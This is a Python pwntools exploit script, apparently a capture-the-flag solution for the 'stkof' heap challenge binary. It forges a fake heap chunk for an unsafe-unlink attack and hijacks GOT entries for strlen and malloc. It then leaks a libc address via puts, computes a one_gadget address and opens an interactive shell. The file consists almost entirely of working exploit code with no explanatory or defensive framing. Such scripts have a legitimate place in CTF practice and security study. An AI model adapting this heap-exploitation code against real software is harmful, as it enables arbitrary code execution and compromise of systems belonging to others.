from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'stkof'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    libc = elf.libc
else:
    host = ''
    port = ''
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here

def buat(size):
	sl("1")
	sl(str(size))
	ru("OK")

def isi(idx,jml,content):
	sl("2")
	sl(str(idx))
	sl(str(jml))
	s(content)
	ru("OK")

def free(idx):
	sl("3")
	sl(str(idx))

buat(0x80)
buat(0x80)
buat(0x80)
buat(0x80)
buat(0x80)#fake_chunk

fk = p64(0)
fk += p64(0x80)
fk += p64(0x602160 -(8*3))
fk += p64(0x602160 -(8*2))
fk += p64(0)
fk += "A"*(0x58)
fk += p64(0x80)
fk += p64(0x90)

isi(4,len(fk),fk)
free(5)

isi(4,16,p64(elf.got['strlen'])+p64(elf.got['malloc']))
isi(1,8,p64(elf.plt['puts']))

sl("4")
sl("2")
xp.recvline()
xp.recvline()
leak = uu64(xp.recvline()[:-1])
print hex(leak)

libcbase = leak - libc.symbols['malloc']
print hex(libcbase)
one = libcbase + 0xf0364

isi(4,8,p64(elf.got['malloc']))
isi(1,8,p64(one))
sl("1")
sl("1")

xp.interactive()
